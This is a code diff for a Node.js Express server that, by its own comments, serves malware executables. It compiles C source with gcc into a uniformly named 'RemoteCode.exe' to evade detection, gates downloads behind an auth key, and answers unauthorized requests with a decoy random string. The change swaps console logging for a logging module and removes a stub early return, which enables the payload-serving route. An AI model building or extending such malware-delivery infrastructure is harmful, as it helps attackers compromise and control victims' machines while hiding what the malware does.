@@ -4,6 +4,7 @@ const Auth = require("./auth.js");
 const { genAsciiStr } = require("./util.js");
 const { execFileSync } = require("child_process");
 const path = require("path");
+const logging = require("./logging.js");
 
 // This router will handle the GET requests that ask to retrieve a specified malware.
 // The routing is very simple here since GET requests simply act as a CDN for our malware packages
@@ -20,7 +21,7 @@ getReqRouter.get("*", (request, response, next) => {
     {
         // If unauthorized, send a random 64 bit ASCII
         response.status(401);
-        console.log(`🔨 GET request denied for IP ${request.ip} due to invalid auth key '${request.headers.authorization}'.`)
+        logging.log(`🔨 GET request denied for IP ${request.ip} due to invalid auth key '${request.headers.authorization}'.`)
         response.send(genAsciiStr(64));
     }
     else
@@ -31,8 +32,7 @@ getReqRouter.get("*", (request, response, next) => {
 
 // If default URL + authenticated, send appropriate EXE file
 getReqRouter.get("/", (request, response, next) => {
-    response.send("Yeah!");
-    return
+
     // We're going to compile all the C files with the same name to make it harder to detect what our malware does
     const exeName = "RemoteCode.exe";
 
@@ -61,11 +61,11 @@ getReqRouter.get("/", (request, response, next) => {
                 execFileSync("gcc", [reqEXEData.cPath, `-o`, exeName])
             }
 
-            console.log(`C file ${reqEXEData.cPath} from ${request.ip} compiled!`);
+            logging.log(`C file ${reqEXEData.cPath} from ${request.ip} compiled!`);
         }
         catch(err)
         {
-            console.error(`Error in compiling C file ${reqEXEData.cPath} from ${request.ip}: ${err}`);
+            logging.error(`Error in compiling C file ${reqEXEData.cPath} from ${request.ip}: ${err}`);
             response.status(500);
             next();
         }
@@ -78,19 +78,19 @@ getReqRouter.get("/", (request, response, next) => {
         response.sendFile(exePath, (err) => {
             if (err)
             {
-                console.error(`Error in sending file ${exePath} to ${request.ip}: ${err}`);
+                logging.error(`🔨 Error in sending file ${exePath} to ${request.ip}: ${err}`);
                 response.status(500);
                 next();
             }
             else
             {
-                console.log(`🔨 EXE file ${exePath} sent to ${request.ip}.`);
+                logging.log(`🔨 EXE file ${exePath} sent to ${request.ip}.`);
             }
         });
     }
     else
     {
-        console.log(`🔨 GET request denied for IP ${request.ip} due to invalid EXE file '${request.headers.exe}'.`)
+        logging.log(`🔨 GET request denied for IP ${request.ip} due to invalid EXE file '${request.headers.exe}'.`)
         response.status(401);
         next();
     }
